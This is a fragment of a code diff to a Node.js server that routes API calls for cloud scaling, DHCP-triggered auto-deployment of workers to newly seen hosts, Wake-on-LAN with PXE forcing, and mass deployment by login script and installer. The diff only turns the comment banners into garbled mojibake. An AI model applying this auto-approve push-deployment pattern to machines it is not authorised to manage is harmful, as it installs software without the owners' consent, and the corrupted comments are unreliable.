+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/cloud/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/cloud/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/cloud/status') {
       var CloudScaler = require('./cloud-scaler');
       if (!_refs.cloudScaler) _refs.cloudScaler = new CloudScaler();
       return json(res, 200, _refs.cloudScaler.getStatus());
     }
 
-    // â•â•â• GET /api/cloud/instances â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/cloud/instances Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/cloud/instances') {
       var CloudScaler = require('./cloud-scaler');
       if (!_refs.cloudScaler) _refs.cloudScaler = new CloudScaler();
       return json(res, 200, _refs.cloudScaler.listInstances());
     }
 
-    // â•â•â• POST /api/cloud/provision â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/cloud/provision Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/cloud/provision') {
       var CloudScaler = require('./cloud-scaler');
       if (!_refs.cloudScaler) _refs.cloudScaler = new CloudScaler();
@@ -4061,7 +4121,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• DELETE /api/cloud/instance â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/cloud/instance Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath === '/api/cloud/instance') {
       var CloudScaler = require('./cloud-scaler');
       if (!_refs.cloudScaler) _refs.cloudScaler = new CloudScaler();
@@ -4071,7 +4131,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/cloud/cost â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/cloud/cost Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/cloud/cost') {
       var CloudScaler = require('./cloud-scaler');
       if (!_refs.cloudScaler) _refs.cloudScaler = new CloudScaler();
@@ -4148,32 +4208,32 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // Network Watcher â€" DHCP-triggered Auto-Deployment
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // Network Watcher Ã¢â‚¬" DHCP-triggered Auto-Deployment
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/watcher/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/watcher/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/watcher/status') {
       var NetworkWatcher = require('./network-watcher');
       if (!_refs.networkWatcher) _refs.networkWatcher = new NetworkWatcher({ config: _refs.config, networkDeployer: _refs.networkDeployer });
       return json(res, 200, _refs.networkWatcher.getStatus());
     }
 
-    // â•â•â• GET /api/watcher/pending â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/watcher/pending Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/watcher/pending') {
       var NetworkWatcher = require('./network-watcher');
       if (!_refs.networkWatcher) _refs.networkWatcher = new NetworkWatcher({ config: _refs.config, networkDeployer: _refs.networkDeployer });
       return json(res, 200, { pending: _refs.networkWatcher.getPending() });
     }
 
-    // â•â•â• GET /api/watcher/deployed â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/watcher/deployed Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/watcher/deployed') {
       var NetworkWatcher = require('./network-watcher');
       if (!_refs.networkWatcher) _refs.networkWatcher = new NetworkWatcher({ config: _refs.config, networkDeployer: _refs.networkDeployer });
       return json(res, 200, { deployed: _refs.networkWatcher.getDeployed() });
     }
 
-    // â•â•â• POST /api/watcher/approve â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/watcher/approve Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/watcher/approve') {
       if (!_refs.networkWatcher) return json(res, 500, { error: 'Watcher not initialized' });
       var body = JSON.parse(await readBody(req));
@@ -4186,7 +4246,7 @@ async function handleRequest(req, res) {
       return json(res, ok ? 200 : 404, ok ? { approved: body.ip } : { error: 'Not found or not pending' });
     }
 
-    // â•â•â• POST /api/watcher/reject â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/watcher/reject Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/watcher/reject') {
       if (!_refs.networkWatcher) return json(res, 500, { error: 'Watcher not initialized' });
       var body = JSON.parse(await readBody(req));
@@ -4195,7 +4255,7 @@ async function handleRequest(req, res) {
       return json(res, ok ? 200 : 404, ok ? { rejected: body.ip } : { error: 'Not found' });
     }
 
-    // â•â•â• POST /api/watcher/auto-approve â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/watcher/auto-approve Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/watcher/auto-approve') {
       var NetworkWatcher = require('./network-watcher');
       if (!_refs.networkWatcher) _refs.networkWatcher = new NetworkWatcher({ config: _refs.config, networkDeployer: _refs.networkDeployer });
@@ -4204,7 +4264,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { autoApprove: _refs.networkWatcher.autoApprove });
     }
 
-    // â•â•â• POST /api/watcher/site â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/watcher/site Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/watcher/site') {
       var NetworkWatcher = require('./network-watcher');
       if (!_refs.networkWatcher) _refs.networkWatcher = new NetworkWatcher({ config: _refs.config, networkDeployer: _refs.networkDeployer });
@@ -4214,14 +4274,14 @@ async function handleRequest(req, res) {
       return json(res, 200, { site: body.name, subnet: body.subnet });
     }
 
-    // â•â•â• GET /api/watcher/sites â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/watcher/sites Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/watcher/sites') {
       var NetworkWatcher = require('./network-watcher');
       if (!_refs.networkWatcher) _refs.networkWatcher = new NetworkWatcher({ config: _refs.config, networkDeployer: _refs.networkDeployer });
       return json(res, 200, { sites: _refs.networkWatcher.getSites() });
     }
 
-    // â•â•â• POST /api/watcher/start â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/watcher/start Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/watcher/start') {
       var NetworkWatcher = require('./network-watcher');
       if (!_refs.networkWatcher) _refs.networkWatcher = new NetworkWatcher({ config: _refs.config, networkDeployer: _refs.networkDeployer });
@@ -4229,18 +4289,18 @@ async function handleRequest(req, res) {
       return json(res, 200, { watching: true });
     }
 
-    // â•â•â• POST /api/watcher/stop â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/watcher/stop Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/watcher/stop') {
       if (!_refs.networkWatcher) return json(res, 200, { watching: false });
       _refs.networkWatcher.stop();
       return json(res, 200, { watching: false });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Adaptive Deploy Learner
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/deploy-learner/stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy-learner/stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/deploy-learner/stats') {
       if (!_refs.deployLearner) {
         var DeployLearner = require('./deploy-learner');
@@ -4249,7 +4309,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.deployLearner.getStats());
     }
 
-    // â•â•â• GET /api/deploy-learner/failures â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy-learner/failures Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/deploy-learner/failures') {
       if (!_refs.deployLearner) {
         var DeployLearner = require('./deploy-learner');
@@ -4258,7 +4318,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { failures: _refs.deployLearner.getFailureReport() });
     }
 
-    // â•â•â• POST /api/deploy-learner/retry â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/deploy-learner/retry Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/deploy-learner/retry') {
       if (!_refs.deployLearner) {
         var DeployLearner = require('./deploy-learner');
@@ -4276,7 +4336,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { queued: true, retryAll: true });
     }
 
-    // â•â•â• GET /api/deploy-learner/strategy/:ip â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy-learner/strategy/:ip Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath.startsWith('/api/deploy-learner/strategy/')) {
       if (!_refs.deployLearner) {
         var DeployLearner = require('./deploy-learner');
@@ -4286,7 +4346,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.deployLearner.getBestStrategy(decodeURIComponent(stratIp)));
     }
 
-    // â•â•â• GET /api/deploy-learner/log â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy-learner/log Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/deploy-learner/log') {
       if (!_refs.deployLearner) {
         var DeployLearner = require('./deploy-learner');
@@ -4296,11 +4356,11 @@ async function handleRequest(req, res) {
       return json(res, 200, { log: _refs.deployLearner.getLog(parseInt(qp.limit) || 100) });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Wake-on-LAN Manager
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â"€â"€â"€ POST /api/wol/wake â"€â"€â"€
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ POST /api/wol/wake Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬
     if (method === 'POST' && reqPath === '/api/wol/wake') {
       var WoLManager = require('./wol-manager');
       var wol = _refs.wolManager;
@@ -4316,7 +4376,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â"€â"€â"€ GET /api/wol/health â"€â"€â"€
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ GET /api/wol/health Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬
     if (method === 'GET' && reqPath === '/api/wol/health') {
       var WoLManager = require('./wol-manager');
       var wol = _refs.wolManager;
@@ -4324,7 +4384,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { health: wol.getHealth(), watchdogEnabled: wol._watchdogEnabled });
     }
 
-    // â"€â"€â"€ POST /api/wol/watchdog â"€â"€â"€
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ POST /api/wol/watchdog Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬
     if (method === 'POST' && reqPath === '/api/wol/watchdog') {
       var WoLManager = require('./wol-manager');
       var wol = _refs.wolManager;
@@ -4334,7 +4394,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { watchdogEnabled: enabled });
     }
 
-    // â"€â"€â"€ POST /api/wol/pxe-force â"€â"€â"€
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ POST /api/wol/pxe-force Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬
     if (method === 'POST' && reqPath === '/api/wol/pxe-force') {
       var WoLManager = require('./wol-manager');
       var wol = _refs.wolManager;
@@ -4350,7 +4410,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â"€â"€â"€ GET /api/wol/devices â"€â"€â"€
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ GET /api/wol/devices Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬
     if (method === 'GET' && reqPath === '/api/wol/devices') {
       var WoLManager = require('./wol-manager');
       var wol = _refs.wolManager;
@@ -4359,7 +4419,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { devices: wol.getDevices(qp_wol.site || null) });
     }
 
-    // â"€â"€â"€ POST /api/wol/device â"€â"€â"€ (add device)
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ POST /api/wol/device Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ (add device)
     if (method === 'POST' && reqPath === '/api/wol/device') {
       var WoLManager = require('./wol-manager');
       var wol = _refs.wolManager;
@@ -4370,11 +4430,11 @@ async function handleRequest(req, res) {
       return json(res, 200, { device: dev });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // Mass Deploy â€" Login Script, Installer, RPi
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // Mass Deploy Ã¢â‚¬" Login Script, Installer, RPi
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/deploy/login-script â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy/login-script Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/deploy/login-script') {
       var batPath = path.join(__dirname, '..', 'deploy', 'netlogon', 'login-deploy.bat');
       try {
@@ -4384,7 +4444,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 404, { error: 'login-deploy.bat not found' }); }
     }
 
-    // â•â•â• GET /api/deploy/installer â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy/installer Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/deploy/installer') {
       var exePath = path.join(__dirname, '..', 'deploy', 'msi', 'aries-worker-setup.exe');
       try {
@@ -4394,7 +4454,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 404, { error: 'Installer not built yet. POST /api/deploy/build-installer first.' }); }
     }
 
-    // â•â•â• POST /api/deploy/build-installer â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/deploy/build-installer Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/deploy/build-installer') {
       try {
         var builder = require(path.join(__dirname, '..', 'deploy', 'msi', 'build-installer.js'));
@@ -4407,7 +4467,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/deploy/rpi-script â•â•â•
